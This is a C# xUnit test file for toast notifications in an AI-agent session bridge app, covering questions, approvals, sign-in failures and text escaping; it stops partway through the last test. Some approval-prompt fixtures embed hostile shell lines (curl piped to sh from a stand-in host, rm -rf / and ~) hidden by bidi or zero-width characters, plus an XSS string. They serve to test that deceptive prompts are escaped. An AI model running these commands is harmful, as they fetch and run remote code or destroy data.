using System.Text.Json;
using System.Xml.Linq;
using AgentBridge.App.Core;
using AgentBridge.Local;
using AgentBridge.Protocol;
using Microsoft.Extensions.Time.Testing;
using Xunit;

// Toasts: when they are raised, what they say and offer, and what a click on one sends.
public sealed class ToastTests
{
    readonly FakeTimeProvider clock = new(Make.T0);
    readonly Sink sink = new();

    sealed class Sink : IToastSink
    {
        public List<ToastNotice> Shown { get; } = [];
        public List<string> Withdrawn { get; } = [];
        public void Show(ToastNotice notice) => Shown.Add(notice);
        public void Withdraw(string tag) => Withdrawn.Add(tag);
    }

    static readonly string[] Caps = [Capabilities.SessionsRead, Capabilities.SessionsAnswer, Capabilities.SessionsApprove];

    ToastPlanner Planner(bool active = false, bool quiet = false) => new(sink, clock)
    {
        Capabilities = () => Caps,
        MachineName = () => "Test PC",
        WindowActive = () => active,
        Quiet = () => quiet,
    };

    static XElement Xml(ToastNotice n) => XElement.Parse(n.Xml);

    // Toasts about sessions, without the machine's sign-in toast (SignIns).
    List<ToastNotice> Finished() => [.. sink.Shown.Where(t => !t.Tag.StartsWith("signin:", StringComparison.Ordinal))];

    static Session NeedsSignIn(string id, string account = "octo", string? recovery = null)
    {
        var attention = new System.Text.Json.Nodes.JsonObject { ["kind"] = "signInNeeded", ["agent"] = "copilot", ["account"] = account };
        if (recovery is not null) { attention["recovery"] = recovery; }
        return AuthState.Attach(Make.Session(id, response: "Done.", turns: 2), JsonDocument.Parse(new System.Text.Json.Nodes.JsonObject { ["attention"] = attention }.ToJsonString()).RootElement);
    }

    // A recount while the window was in front changed nothing on the toast: it is made once the
    // window is not, quietly, never left saying the old count until the hourly repeat.
    [Fact]
    public void A_sign_in_toast_recounted_while_the_window_was_in_front_is_updated_quietly_once_it_is_not()
    {
        var front = false;
        var p = new ToastPlanner(sink, clock) { Capabilities = () => Caps, MachineName = () => "Test PC", WindowActive = () => front, Quiet = () => false };
        p.Upsert(NeedsSignIn("s1"));
        p.Tick();
        front = true;
        p.Upsert(NeedsSignIn("s2"));
        p.Tick();
        Assert.Single(sink.Shown);

        front = false;
        p.Tick();
        Assert.Equal((2, "2 sessions affected", true), (sink.Shown.Count, Xml(sink.Shown[^1]).Descendants("text").Last().Value, sink.Shown[^1].Quiet));
    }

    // #800 P0: a 401 stopped every session on a machine and nothing on the desktop said so. One toast
    // per agent and account, in ui.md §6.13's words, at once; its count kept up quietly; again only
    // after an hour while it lasts; withdrawn once every session is signed in again.
    [Fact]
    public void Sessions_that_need_sign_in_raise_one_toast_per_agent_and_account_until_they_are_signed_in_again()
    {
        var p = Planner();
        p.Upsert(NeedsSignIn("s1"));
        p.Tick();
        var toast = Assert.Single(sink.Shown);
        Assert.Equal(PushNotice.SignInKey(AgentKind.Copilot, "octo"), toast.Tag);
        Assert.Equal(["Copilot on Test PC needs sign-in", "1 session affected"], Xml(toast).Descendants("text").Select(t => t.Value));
        Assert.DoesNotContain("octo", toast.Xml, StringComparison.Ordinal);
        Assert.False(toast.Quiet);

        p.Upsert(NeedsSignIn("s2"));
        p.Upsert(Make.Session("s3", status: SessionStatus.Working));
        p.Tick();
        Assert.Equal((2, "2 sessions affected", true), (sink.Shown.Count, Xml(sink.Shown[^1]).Descendants("text").Last().Value, sink.Shown[^1].Quiet));

        clock.Advance(TimeSpan.FromMinutes(59));
        p.Tick();
        Assert.Equal(2, sink.Shown.Count);
        clock.Advance(TimeSpan.FromMinutes(1));
        p.Tick();
        Assert.Equal((3, false), (sink.Shown.Count, sink.Shown[^1].Quiet));

        // Signed in and waiting for the session to confirm is no longer the person's to do.
        p.Upsert(NeedsSignIn("s1", recovery: "pending"));
        p.Upsert(Make.Session("s2"));
        p.Tick();
        Assert.Equal([toast.Tag], sink.Withdrawn);
    }

    [Fact]
    public void A_question_still_pending_after_two_seconds_raises_one_toast()
    {
        var p = Planner();
        p.Upsert(Make.Session());
        p.Upsert(Make.Session(question: Make.Choice()));
        clock.Advance(TimeSpan.FromSeconds(1));
        p.Tick();
        Assert.Empty(sink.Shown);

        clock.Advance(TimeSpan.FromSeconds(1));
        p.Tick();
        p.Upsert(Make.Session(question: Make.Choice(), response: "changed"));
        clock.Advance(TimeSpan.FromSeconds(5));
        p.Tick();

        var toast = Assert.Single(sink.Shown);
        Assert.Equal("s1", toast.Tag);
        Assert.Equal(["A session", "Test PC · waiting on you", "Which database?"], Xml(toast).Descendants("text").Select(t => t.Value));
    }

    // A host updated to refuse what it used to offer says so under the same id (#220): the toast up
    // is replaced, quietly, never left offering answers the question no longer takes.
    [Fact]
    public void A_toast_whose_question_comes_back_answerable_only_at_the_machine_loses_its_answer_buttons()
    {
        static IEnumerable<string> Actions(ToastNotice n) => Xml(n).Descendants("action").Select(a => (string)a.Attribute("content")!);
        var p = Planner();
        p.Upsert(Make.Session(question: Make.Choice()));
        clock.Advance(TimeSpan.FromSeconds(3));
        p.Tick();
        Assert.Contains("sqlite", Actions(Assert.Single(sink.Shown)));

        p.Upsert(Make.Session(question: Make.Choice() with { AnswerAtMachine = true }));
        p.Upsert(Make.Session(question: Make.Choice() with { AnswerAtMachine = true }));

        Assert.Equal(2, sink.Shown.Count);
        var replaced = sink.Shown[1];
        Assert.Equal(("s1", true), (replaced.Tag, replaced.Quiet));
        Assert.Equal(["Open"], Actions(replaced));
    }
    // Where no toast would be put up now (the window in front, or notifications turned off), the toast
    // of a question that comes back otherwise is withdrawn, not put up again.
    [Theory]
    [InlineData(true, false)]
    [InlineData(false, true)]
    public void A_toast_whose_question_comes_back_otherwise_where_no_toast_would_be_shown_now_is_withdrawn(bool inFront, bool turnedOff)
    {
        var (active, off) = (false, false);
        var p = new ToastPlanner(sink, clock) { Capabilities = () => Caps, MachineName = () => "Test PC", WindowActive = () => active, Enabled = () => !off, Quiet = () => false };
        p.Upsert(Make.Session(question: Make.Choice()));
        clock.Advance(TimeSpan.FromSeconds(3));
        p.Tick();
        Assert.Single(sink.Shown);

        (active, off) = (inFront, turnedOff);
        p.Upsert(Make.Session(question: Make.Choice() with { AnswerAtMachine = true }));

        Assert.Single(sink.Shown);
        Assert.Equal(["s1"], sink.Withdrawn);
    }

    [Fact]
    public void After_a_reconnect_a_question_answered_meanwhile_loses_its_toast_and_one_asked_meanwhile_gets_one()
    {
        var p = Planner();
        p.Baseline([Make.Session(question: Make.Choice("q1")), Make.Session("s2", response: "Done.")]);
        clock.Advance(TimeSpan.FromSeconds(3));
        p.Tick();
        Assert.Single(sink.Shown);

        // The host was away; its snapshot on reconnecting is a baseline again.
        p.Baseline([Make.Session(), Make.Session("s2", question: Make.Choice("q9"), response: "Done.")]);
        clock.Advance(TimeSpan.FromSeconds(3));
        p.Tick();

        Assert.Equal(["s1"], sink.Withdrawn);
        Assert.Equal(2, sink.Shown.Count);
        Assert.Equal("s2", sink.Shown[1].Tag);
        Assert.Contains("q9", sink.Shown[1].Xml);
    }

    [Fact]
    public void A_question_answered_within_two_seconds_raises_nothing_and_one_answered_later_withdraws_its_toast()
    {
        var p = Planner();
        p.Upsert(Make.Session(question: Make.Choice("q1")));
        p.Upsert(Make.Session());
        clock.Advance(TimeSpan.FromSeconds(3));
        p.Tick();
        Assert.Empty(sink.Shown);

        p.Upsert(Make.Session(question: Make.Choice("q2")));
        clock.Advance(TimeSpan.FromSeconds(3));
        p.Tick();
        p.Upsert(Make.Session());
        Assert.Single(sink.Shown);
        Assert.Equal(["s1"], sink.Withdrawn);
    }

    [Fact]
    public void Another_machines_question_answered_there_withdraws_the_toast_it_raised()
    {
        var p = new ToastPlanner(sink, clock) { Capabilities = () => Caps, MachineName = () => "Build server", WindowActive = () => false, Quiet = () => false, MachineKey = "remote-id" };
        p.Upsert(Make.Session(question: Make.Choice("q1")));
        clock.Advance(TimeSpan.FromSeconds(3));
        p.Tick();
        p.Upsert(Make.Session());

        var tag = ToastPlanner.Tag("s1", "remote-id");
        Assert.Equal(tag, Assert.Single(sink.Shown).Tag);
        Assert.Equal([tag], sink.Withdrawn);
    }

    [Fact]
    public void A_session_that_ends_keeps_its_finished_toast_until_its_machine_leaves()
    {
        var p = new ToastPlanner(sink, clock) { Capabilities = () => Caps, MachineName = () => "Build server", WindowActive = () => false, Quiet = () => false, FinishedEnabled = () => true, MachineKey = "remote-id" };
        foreach (var id in new[] { "s1", "s2" })
        {
            p.Upsert(Make.Session(id, status: SessionStatus.Working));
            p.Upsert(Make.Session(id, response: "Done.", turns: 2));
        }
        p.Upsert(Make.Session("s3", question: Make.Choice("q1")));
        clock.Advance(TimeSpan.FromSeconds(3));
        p.Tick();
        Assert.Equal(3, sink.Shown.Count);

        p.Remove("s1");
        Assert.Empty(sink.Withdrawn);
        p.MachineGone();
        Assert.Equal(new[] { "s1", "s2", "s3" }.Select(s => ToastPlanner.Tag(s, "remote-id")).Order(), sink.Withdrawn.Order());
    }

    [Fact]
    public void Nothing_is_raised_while_the_window_is_in_front_and_toasts_go_quietly_when_windows_says_the_person_is_busy()
    {
        Planner(active: true).Tap(clock, Make.Session(question: Make.Choice()));
        Assert.Empty(sink.Shown);

        Planner(quiet: true).Tap(clock, Make.Session("s2", question: Make.Choice()));
        Assert.True(Assert.Single(sink.Shown).Quiet);
    }

    [Fact]
    public void A_finished_turn_raises_a_toast_once_three_seconds_later_but_not_a_session_already_idle_at_start()
    {
        var p = Planner();
        p.Baseline([Make.Session("old", response: "done before")]);
        p.Upsert(Make.Session(status: SessionStatus.Working));
        p.Upsert(Make.Session(response: "All **green**.", turns: 2));
        clock.Advance(TimeSpan.FromSeconds(3));
        p.Tick();
        p.Upsert(Make.Session(response: "All **green**.", turns: 2));
        clock.Advance(TimeSpan.FromSeconds(3));
        p.Tick();

        var toast = Assert.Single(sink.Shown);
        Assert.Equal(["A session", "Test PC · finished", "All green."], Xml(toast).Descendants("text").Select(t => t.Value));
    }

    [Fact]
    public void A_finished_turn_previews_the_main_agents_own_words_never_a_delegates_and_a_delegate_alone_finishes_no_turn()
    {
        var p = Planner();
        var byDelegate = new ActivitySource { Response = "agent-1" };
        p.Upsert(Make.Session(status: SessionStatus.Working));
        p.Upsert(Make.Session(turns: 2) with { Activity = new Activity { Response = "A delegate's findings.", TurnCount = 2, Source = byDelegate, Own = new OwnActivity { Response = "Started the delegates." } } });
        clock.Advance(TimeSpan.FromSeconds(3));
        p.Tick();
        Assert.Equal("Started the delegates.", Xml(Assert.Single(sink.Shown)).Descendants("text").Last().Value);

        // The main agent has no words of its own this turn: the delegate's are not news.
        p.Upsert(Make.Session("s2", status: SessionStatus.Working));
        p.Upsert(Make.Session("s2") with { Activity = new Activity { Response = "A delegate's findings.", Source = byDelegate } });
        clock.Advance(TimeSpan.FromSeconds(3));
        p.Tick();
        Assert.Single(sink.Shown);
    }

    static Session AskedByDelegate(string id, string response) => Make.Session(id, question: Make.Choice() with { Agent = "agent-1" }, response: response) with { WaitingOn = "agent-1" };

    [Fact]
    public void Answering_a_delegates_question_ends_a_turn_only_if_the_main_agent_was_working_asking_or_wrote_since()
    {
        var p = Planner();
        // Idle, then a delegate asks, answered within two seconds, and the main agent stays idle
        // with the words it had: no turn ended.
        p.Upsert(Make.Session("idle", response: "Old."));
        p.Upsert(AskedByDelegate("idle", "Old."));
        p.Upsert(Make.Session("idle", response: "Old."));
        // Mid-turn, a delegate asks: answering it ends the turn.
        p.Upsert(Make.Session("busy", status: SessionStatus.Working, response: "Old."));
        p.Upsert(AskedByDelegate("busy", "Old."));
        p.Upsert(Make.Session("busy", response: "Old."));
        // Mid-turn, the main agent asks, and a delegate straight after: still that turn.
        p.Upsert(Make.Session("asked", status: SessionStatus.Working, response: "Old."));
        p.Upsert(Make.Session("asked", question: Make.Choice(), response: "Old."));
        p.Upsert(AskedByDelegate("asked", "Old."));
        p.Upsert(Make.Session("asked", response: "Old."));
        // Idle, a delegate asks, and the main agent writes something new by the end.
        p.Upsert(Make.Session("wrote", response: "Old."));
        p.Upsert(AskedByDelegate("wrote", "Old."));
        p.Upsert(Make.Session("wrote", response: "New."));
        clock.Advance(TimeSpan.FromSeconds(3));
        p.Tick();

        Assert.Equal(["asked", "busy", "wrote"], sink.Shown.Select(n => n.Tag).Order());
    }

    // #800: a 401 ends the turn, the session goes working to idle with its previous answer still
    // there, and the agent is dead. No "finished" toast quotes that stale answer.
    [Fact]
    public void A_turn_that_ended_on_a_sign_in_failure_or_an_error_raises_no_finished_toast()
    {
        static Session Stopped(string id, string attention) =>
            AuthState.Attach(Make.Session(id, response: "Done.", turns: 2), System.Text.Json.JsonDocument.Parse($$"""{"attention":{{attention}}}""").RootElement);
        var p = Planner();
        p.Upsert(Make.Session("s1", status: SessionStatus.Working));
        p.Upsert(Stopped("s1", """{"kind":"signInNeeded","agent":"copilot"}"""));
        p.Upsert(Make.Session("s2", status: SessionStatus.Working));
        p.Upsert(Stopped("s2", """{"kind":"error","errorClass":"auth"}"""));
        clock.Advance(TimeSpan.FromSeconds(3));
        p.Tick();
        // The sign-in has a toast of its own, for the machine (SignIns), never the session's.
        Assert.Empty(Finished());

        // The attention comes in the update after the turn ended: the toast due is dropped.
        p.Upsert(Make.Session("s3", status: SessionStatus.Working));
        p.Upsert(Make.Session("s3", response: "Done.", turns: 2));
        p.Upsert(Stopped("s3", """{"kind":"error","errorClass":"rate"}"""));
        clock.Advance(TimeSpan.FromSeconds(3));
        p.Tick();
        Assert.Empty(Finished());

        // Already up when it comes: withdrawn.
        p.Upsert(Make.Session("s4", status: SessionStatus.Working));
        p.Upsert(Make.Session("s4", response: "Done.", turns: 2));
        clock.Advance(TimeSpan.FromSeconds(3));
        p.Tick();
        Assert.Single(Finished());
        p.Upsert(Stopped("s4", """{"kind":"signInNeeded","agent":"copilot"}"""));
        Assert.Equal([ToastPlanner.Tag("s4", null)], sink.Withdrawn);
    }

    // #878: a later turn that fails withdraws nothing of an earlier turn that really finished, even
    // with that turn's answer still the session's latest; and raises no toast of its own.
    [Fact]
    public void A_later_turn_that_fails_leaves_an_earlier_turns_finished_toast_up()
    {
        static Session Stopped(string id, int turns) =>
            AuthState.Attach(Make.Session(id, response: "Done.", turns: turns), JsonSerializer.SerializeToElement(new { attention = new { kind = "signInNeeded", agent = "copilot" } }));
        var p = Planner();
        p.Upsert(Make.Session("s1", status: SessionStatus.Working));
        p.Upsert(Make.Session("s1", response: "Done.", turns: 2));
        clock.Advance(TimeSpan.FromSeconds(3));
        p.Tick();
        Assert.Single(sink.Shown);

        // The next turn runs, and ends on a 401 with the old answer still there, its turn count the
        // same or moved on.
        p.Upsert(Make.Session("s1", status: SessionStatus.Working, response: "Done.", turns: 2));
        p.Upsert(Stopped("s1", 2));
        p.Upsert(Make.Session("s1", status: SessionStatus.Working, response: "Done.", turns: 2));
        p.Upsert(Stopped("s1", 3));
        clock.Advance(TimeSpan.FromSeconds(3));
        p.Tick();
        Assert.Empty(sink.Withdrawn);
        // The machine's sign-in toast is the failure's own notice (SignIns); no other toast is raised.
        Assert.Single(Finished());
    }

    // #878: a failure that replaces the turn's response (the parser's "Turn error" notice) is still
    // that turn's: its finished toast is withdrawn.
    [Fact]
    public void A_failure_that_replaces_the_turns_response_still_withdraws_that_turns_finished_toast()
    {
        var p = Planner();
        p.Upsert(Make.Session("s1", status: SessionStatus.Working));
        p.Upsert(Make.Session("s1", response: "Done.", turns: 2));
        clock.Advance(TimeSpan.FromSeconds(3));
        p.Tick();
        Assert.Single(sink.Shown);

        p.Upsert(AuthState.Attach(Make.Session("s1", response: "Turn error: the request failed.", turns: 2), JsonSerializer.SerializeToElement(new { attention = new { kind = "error", errorClass = "auth" } })));
        Assert.Equal([ToastPlanner.Tag("s1", null)], sink.Withdrawn);
    }

    // #878: a later turn known only by its count (no working seen) that arrives already stopped is
    // not the toasted turn: its finished toast stays.
    [Fact]
    public void A_later_turn_that_arrives_already_stopped_leaves_the_earlier_turns_finished_toast_up()
    {
        var p = Planner();
        p.Upsert(Make.Session("s1", status: SessionStatus.Working));
        p.Upsert(Make.Session("s1", response: "Done.", turns: 2));
        clock.Advance(TimeSpan.FromSeconds(3));
        p.Tick();
        Assert.Single(sink.Shown);

        p.Upsert(AuthState.Attach(Make.Session("s1", response: "Done.", turns: 3), JsonSerializer.SerializeToElement(new { attention = new { kind = "signInNeeded", agent = "copilot" } })));
        Assert.Empty(sink.Withdrawn);
    }

    // #878: the toasted turn's failure keeping a delegate's question pending: the host counts the
    // turn one short while the session waits, yet it is the same turn, and its toast is withdrawn.
    [Fact]
    public void A_failure_that_keeps_a_delegates_question_pending_still_withdraws_that_turns_finished_toast()
    {
        var p = Planner();
        p.Upsert(Make.Session("s1", status: SessionStatus.Working));
        p.Upsert(Make.Session("s1", response: "Done.", turns: 2));
        clock.Advance(TimeSpan.FromSeconds(3));
        p.Tick();
        Assert.Single(sink.Shown);

        var waiting = Make.Session("s1", status: SessionStatus.Waiting, question: Make.Choice() with { Agent = "agent-1" }, response: "Done.", turns: 1) with { WaitingOn = "agent-1" };
        p.Upsert(AuthState.Attach(waiting, JsonSerializer.SerializeToElement(new { attention = new { kind = "error", errorClass = "auth" } })));
        Assert.Equal([ToastPlanner.Tag("s1", null)], sink.Withdrawn);
    }

    // #878 (r4483045584): the next prompt's turn fails while a delegate's question keeps the session
    // waiting, the main agent never seen working: the host counts that turn one short, so its count
    // is the toasted turn's, but its prompt is the next one, and the earlier turn's toast stays.
    [Fact]
    public void A_later_prompts_turn_that_fails_while_a_delegate_asks_leaves_the_earlier_turns_finished_toast_up()
    {
        var p = Planner();
        p.Upsert(Make.Session("s1", status: SessionStatus.Working));
        p.Upsert(Make.Session("s1", response: "Done.", turns: 2));
        clock.Advance(TimeSpan.FromSeconds(3));
        p.Tick();
        Assert.Single(sink.Shown);

        var waiting = Make.Session("s1", status: SessionStatus.Waiting, question: Make.Choice() with { Agent = "agent-1" }, response: "Done.", turns: 2) with { WaitingOn = "agent-1" };
        p.Upsert(AuthState.Attach(waiting, JsonSerializer.SerializeToElement(new { attention = new { kind = "error", errorClass = "auth" } })));
        Assert.Empty(sink.Withdrawn);
    }

    // #878: a delegate asking while the main agent stays idle is no new turn: the toasted turn's
    // failure, arriving after it, still withdraws that turn's finished toast.
    [Fact]
    public void A_delegates_question_before_the_toasted_turns_failure_leaves_it_that_turns_to_withdraw()
    {
        var p = Planner();
        p.Upsert(Make.Session("s1", status: SessionStatus.Working));
        p.Upsert(Make.Session("s1", response: "Done.", turns: 2));
        clock.Advance(TimeSpan.FromSeconds(3));
        p.Tick();
        Assert.Single(sink.Shown);

        p.Upsert(Make.Session("s1", status: SessionStatus.Waiting, question: Make.Choice() with { Agent = "agent-1" }, response: "Done.", turns: 2) with { WaitingOn = "agent-1" });
        p.Upsert(AuthState.Attach(Make.Session("s1", response: "Done.", turns: 2), JsonSerializer.SerializeToElement(new { attention = new { kind = "error", errorClass = "auth" } })));
        Assert.Equal([ToastPlanner.Tag("s1", null)], sink.Withdrawn);
    }

    [Fact]
    public void A_finished_turn_whose_main_agent_words_are_gone_when_it_is_due_raises_nothing()
    {
        var p = Planner();
        p.Upsert(Make.Session(status: SessionStatus.Working));
        p.Upsert(Make.Session(response: "Done.", turns: 2));
        // Before the toast is due, a delegate writes last and the budget leaves the main agent's out.
        p.Upsert(Make.Session(turns: 2) with { Activity = new Activity { Response = "A delegate's findings.", TurnCount = 2, Source = new ActivitySource { Response = "agent-1" }, Own = new OwnActivity { ResponseTruncated = true } } });
        clock.Advance(TimeSpan.FromSeconds(3));
        p.Tick();

        Assert.Empty(sink.Shown);
    }

    [Fact]
    public void A_single_choice_question_offers_its_options_as_buttons_with_a_box_for_other()
    {
        var xml = Xml(new ToastNotice("t", ToastXml.Question(Make.Session(question: Make.Choice(other: true)), Caps, null), false));

        Assert.Equal(["other"], xml.Descendants("input").Select(i => (string)i.Attribute("id")!));
        var actions = xml.Descendants("action").Select(a => ((string)a.Attribute("content")!, ToastAction.Parse((string)a.Attribute("arguments")!))).ToList();
        Assert.Equal(["PostgreSQL (Recommended)", "sqlite", "Send"], actions.Select(a => a.Item1));
        Assert.Equal(("option", "answer", "pg"), (actions[0].Item2.Kind, actions[0].Item2.Field, actions[0].Item2.Value));
        Assert.Equal("other", actions[2].Item2.Kind);
    }

    [Fact]
    public void Many_options_go_in_a_list_and_more_than_five_or_a_form_offer_only_open()
    {
        var five = Xml(new ToastNotice("t", ToastXml.Question(Make.Session(question: Make.Choice("q", true, "a", "b", "c", "d", "e")), Caps, null), false));
        Assert.Equal(["choice", "other"], five.Descendants("input").Select(i => (string)i.Attribute("id")!).Order());
        Assert.Equal(5, five.Descendants("selection").Count());

        var six = Xml(new ToastNotice("t", ToastXml.Question(Make.Session(question: Make.Choice("q", false, "a", "b", "c", "d", "e", "f")), Caps, null), false));
        Assert.Equal(["Open"], six.Descendants("action").Select(a => (string)a.Attribute("content")!));

        var form = Xml(new ToastNotice("t", ToastXml.Question(Make.Session(question: Make.Form(new Field { Name = "a", Type = FieldType.Text }, new Field { Name = "b", Type = FieldType.Boolean })), Caps, null), false));
        Assert.Equal(["Open"], form.Descendants("action").Select(a => (string)a.Attribute("content")!));
    }

    [Fact]
    public void An_approval_toast_has_no_approve_or_deny_action_and_every_click_on_it_opens_that_sessions_question()
    {
        foreach (var q in new[] { Make.Approval(), Make.Approval() with { AnswerAtMachine = true } })
        {
            var approval = Xml(new ToastNotice("t", ToastXml.Question(Make.Session(question: q), Caps, "PC", "remote-id"), false));

            Assert.Equal(["Open"], approval.Descendants("action").Select(a => (string)a.Attribute("content")!));
            Assert.Empty(approval.Descendants("input"));
            var clicks = approval.Descendants("action").Select(a => (string)a.Attribute("arguments")!).Append((string)approval.Attribute("launch")!);
            Assert.All(clicks.Select(ToastAction.Parse), a => Assert.Equal(("open", "s1", "remote-id"), (a.Action, a.Session, a.Machine)));
        }
        var shown = Xml(new ToastNotice("t", ToastXml.Question(Make.Session(question: Make.Approval()), Caps, "PC"), false));
        Assert.Contains("PC · waiting for your approval", shown.Descendants("text").Select(t => t.Value));
        var held = Xml(new ToastNotice("t", ToastXml.Question(Make.Session(question: Make.Approval() with { AnswerAtMachine = true }), Caps, "PC"), false));
        Assert.Contains("PC · waiting at the machine", held.Descendants("text").Select(t => t.Value));
    }

    [Fact]
    public void An_approvals_toast_reads_as_its_card_does_the_agents_words_without_their_escapes_and_the_command_as_written()
    {
        // A host escapes the agent's own words (#212); the command is code, so its * and _ are its own.
        var q = Make.Approval() with { Message = "Allow **shell**?\n\nRun it\n\\`\\`\\` \\[safe\\](https\\://other.example)\n\n```\nrm -rf build/**/cache && python __init__.py\n```" };

        var toast = Xml(new ToastNotice("t", ToastXml.Question(Make.Session(question: q), Caps, "PC"), false));

        Assert.Contains("Allow shell? Run it ``` [safe](https://other.example) rm -rf build/**/cache && python __init__.py", toast.Descendants("text").Select(t => t.Value));
    }

    // An older host's approval can hold a reference to a right-to-left letter, which reading it as
    // Markdown decodes: the toast shows it escaped, as the card's source does.
    [Theory]
    [InlineData("Allow **shell**?\n\nTidy &#x5D0;&#x5D1; up\n\n```\nls\n```", "\\u05D0\\u05D1")]
    [InlineData("Allow **shell**?\n\necho &#1488;#;&#1489;;rm -rf ~\n\n```\nls\n```", "\\u05D0#;\\u05D1")]
    public void An_approvals_toast_shows_a_reference_its_words_decode_to_as_an_escape(string message, string shown)
    {
        var toast = Xml(new ToastNotice("t", ToastXml.Question(Make.Session(question: Make.Approval() with { Message = message }), Caps, "PC"), false));

        Assert.Contains(toast.Descendants("text"), t => t.Value.Contains(shown, StringComparison.Ordinal) && !ShownText.HasHidden(t.Value) && !ShownText.HasRightToLeft(t.Value));
    }

    // An older host's approval can still hold a live bidi control or right-to-left letters (#220).
    [Theory]
    [InlineData("Allow **shell**?\n\n```\necho done #\u202E ;hs | p/x//:sptth lruc\n```", "\\u202E")]
    [InlineData("Allow **shell**?\n\n```\ngit status\u200B; curl -s https://x.example/p | sh\n```", "\\u200B")]
    [InlineData("Allow **shell**?\n\n```\necho \u05D0\u05D1\u05D2; rm -rf / #\n```", "\\u05D0\\u05D1\\u05D2")]
    public void A_permission_prompt_drawn_other_than_as_it_runs_is_shown_escaped_and_offers_only_open(string message, string shown)
    {
        var toast = Xml(new ToastNotice("t", ToastXml.Question(Make.Session(question: Make.Approval() with { Message = message }), Caps, "PC"), false));

        Assert.Equal(["Open"], toast.Descendants("action").Select(a => (string)a.Attribute("content")!));
        Assert.Contains(toast.Descendants("text"), t => t.Value.Contains(shown, StringComparison.Ordinal) && !ShownText.HasHidden(t.Value) && !ShownText.HasRightToLeft(t.Value));
    }

    [Fact]
    public void A_question_that_is_not_an_approval_keeps_its_answer_buttons()
    {
        var xml = Xml(new ToastNotice("t", ToastXml.Question(Make.Session(question: Make.Choice() with { Message = "Approve the plan?" }), Caps, null), false));

        var actions = xml.Descendants("action").Select(a => ToastAction.Parse((string)a.Attribute("arguments")!)).ToList();
        Assert.Equal(["answer", "answer"], actions.Select(a => a.Action));
        Assert.All(actions, a => Assert.True(a.Current));
    }

    [Fact]
    public void Whatever_a_session_says_is_escaped_into_the_toast()
    {
        var q = Make.Choice("q<1>", false, "a&b", "\"quoted\"") with { Message = "<script>alert('x')</script> & \u0001" };
        var s = Make.Session(question: q, title: "Fix <b>bold</b> & co");

        var xml = Xml(new ToastNotice("t", ToastXml.Question(s, Caps, null), false));

        Assert.Equal("Fix <b>bold</b> & co", xml.Descendants("text").First().Value);
        var args = xml.Descendants("action").Select(a => ToastAction.Parse((string)a.Attribute("arguments")!)).ToList();
        Assert.Equal(["a&b", "\"quoted\""], args.Select(a => a.Value));
        Assert.All(args, a => Assert.Equal("q<1>", a.Question));
    }

    // A toast with no <audio> plays Windows' default sound (#754).
    static void AssertSilent(string xml)
    {
        var toast = XElement.Parse(xml);
        Assert.Equal("toast", toast.Name.LocalName);
        var audio = Assert.Single(toast.Elements("audio"));
        Assert.Equal("true", (string?)audio.Attribute("silent"));
        Assert.Null(audio.Attribute("src"));
    }

    [Fact]
    public void Every_toast_builder_makes_a_silent_toast_whatever_it_shows()
    {
        var builders = new Dictionary<string, string[]>
        {
            [nameof(ToastXml.Question)] =
            [
                ToastXml.Question(Make.Session(question: Make.Choice(other: true)), Caps, null),
                ToastXml.Question(Make.Session(question: Make.Choice("q", true, "a", "b", "c", "d", "e")), Caps, "PC", "remote-id"),
                ToastXml.Question(Make.Session(question: Make.Choice("q", false, "a", "b", "c", "d", "e", "f")), Caps, null),
                ToastXml.Question(Make.Session(question: Make.Free()), Caps, null),
                ToastXml.Question(Make.Session(question: Make.Form(new Field { Name = "a", Type = FieldType.Text }, new Field { Name = "b", Type = FieldType.Boolean })), Caps, null),
                ToastXml.Question(Make.Session(question: Make.Approval()), Caps, "PC"),
                ToastXml.Question(Make.Session(question: Make.Approval() with { AnswerAtMachine = true }), Caps, "PC"),
                ToastXml.Question(Make.Session(question: Make.Choice()), [Capabilities.SessionsRead], null),
            ],
            [nameof(ToastXml.Finished)] = [ToastXml.Finished(Make.Session(response: "All **green**."), "PC", "remote-id"), ToastXml.Finished(Make.Session(), null)],
            [nameof(ToastXml.Updated)] = [ToastXml.Updated("0.1.9", "0.1.8", "- Quieter toasts"), ToastXml.Updated("0.1.9", "0.1.8", null)],
            [nameof(ToastXml.Outcome)] = [ToastXml.Outcome("s1", "A session", "Sent.", "remote-id"), ToastXml.Outcome("s1", "A session", "Sent.")],
            [nameof(ToastXml.SignIn)] = [ToastXml.SignIn(AgentKind.Copilot, 4, "PC", "remote-id"), ToastXml.SignIn(AgentKind.Claude, 1, null)],
        };
        // A builder added later is held to this too: every public method whose output is a <toast>
        // is listed. Told apart by what it returns, not by name, so a text helper such as Plain or
        // Words added beside the builders is no toast (#792).
        var made = typeof(ToastXml).GetMethods(System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static)
            .Where(m => m.ReturnType == typeof(string) && MakesAToast(m))
            .Select(m => m.Name).Distinct().Order();
        Assert.Equal(builders.Keys.Order(), made);

        Assert.All(builders.Values.SelectMany(x => x), AssertSilent);
    }

    // Whether a public ToastXml method returns a toast, called with an example of each argument. A
    // parameter of a type not known here fails the test rather than letting the method go unchecked.
    static bool MakesAToast(System.Reflection.MethodInfo m)
    {
        var args = m.GetParameters().Select(p => p.ParameterType switch
        {
            var t when t == typeof(Session) => Make.Session(question: Make.Choice(), response: "Done."),
            var t when t == typeof(IReadOnlyList<string>) => (object)Caps,
            var t when t == typeof(string) => "x",
            var t when t == typeof(int) => 300,
            var t when t == typeof(AgentKind) => AgentKind.Copilot,
            var t when t == typeof((string, string)[]) => Array.Empty<(string, string)>(),
            var t => throw new Xunit.Sdk.XunitException($"ToastXml.{m.Name} takes a {t}: give this test an example of one, to tell whether it makes a toast."),
        }).ToArray();
        var made = (string)m.Invoke(null, args)!;
        try { return XElement.Parse(made).Name.LocalName == "toast"; }
        catch (System.Xml.XmlException) { return false; }
    }

    [Fact]
    public void A_question_toast_replaced_under_its_tag_and_a_finished_turns_toast_stay_silent()
    {
        var p = Planner();
        p.Upsert(Make.Session(question: Make.Choice()));
        clock.Advance(TimeSpan.FromSeconds(3));
        p.Tick();
        p.Upsert(Make.Session(question: Make.Choice() with { AnswerAtMachine = true }));
        p.Upsert(Make.Session(status: SessionStatus.Working));
        p.Upsert(Make.Session(response: "Done.", turns: 2));
        clock.Advance(TimeSpan.FromSeconds(3));
        p.Tick();

        Assert.Equal(["s1", "s1", "s1"], sink.Shown.Select(n => n.Tag));
        Assert.All(sink.Shown, n => AssertSilent(n.Xml));
    }

    [Fact]
    public void A_click_on_a_toast_reads_back_as_the_answer_the_card_would_send()
    {
        var option = ToastAction.Parse(ToastXml.Args(("action", "answer"), ("session", "s1"), ("question", "q1"), ("kind", "option"), ("field", "answer"), ("value", "pg")));
